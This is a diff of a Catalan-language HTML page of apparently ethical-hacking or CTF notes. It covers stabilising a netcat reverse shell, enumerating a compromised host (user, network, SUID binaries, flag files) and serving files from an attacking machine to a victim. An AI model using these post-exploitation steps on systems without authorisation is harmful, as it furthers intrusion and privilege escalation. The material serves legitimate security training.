@@ -650,7 +650,7 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           <h3>Estabilitzar shell</h3>
           <p>És molt recomanable estabilitzar una shell inversa després d'obtenir-la amb nc (netcat), sobretot en un entorn de hacking ètic o pentesting controlat.
              Una shell sense estabilitzar és limitada i pot comportar problemes pràctics durant l’execució de comandes.</p>
-          <ul>Les shells bàsiques obtingudes amb nc solen tenir aquests inconvenients
+          <ul>Les shells bàsiques obtingudes amb nc solen tindre aquests inconvenients
             <li>No permeten usar tecles especials (com Ctrl+C, fletxes, Tab per autocompletar...)</li>
             <li>No són PTY interactives, cosa que impedeix executar eines com ssh, sudo, nano, top, etc</li>
             <li>Si la connexió es trenca, la sessió pot quedar corrupta.</li>
@@ -673,8 +673,6 @@ Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna re
             <code>sudo loadkeys es</code>
           </p>
 
-        
-
       </section>
 
 
@@ -695,6 +693,7 @@ Ctrl + Z        # per a suspendre la shell
 stty raw -echo
 fg
 reset
+export TERM=xterm 
       </code></pre>
 
       <h2>🔧 2. Comprovar usuari i privilegis</h2>
@@ -702,7 +701,11 @@ reset
 id
 hostname
 uname -a
-      </code></pre>
+lsb_release -a
+ip a
+pwd
+ls -la /home/
+find / -name "flag" 2>/dev/null    </code></pre>
 
       <h2>🔍 3. Enumeració del sistema</h2>
       <p><strong>Enumerar sistema operatiu</strong></p>
@@ -750,7 +753,7 @@ find / -user root -perm -u=s 2>/dev/null         </code></pre>
 
       <p><strong>Pujada ràpida amb servidor HTTP:</strong></p>
 
-      <p>En la teua màquina:</p>
+      <p>En la màquina atacant:</p>
       <pre><code>python3 -m http.server 8080         </code></pre>
 
       <p>En la màquina víctima:</p>
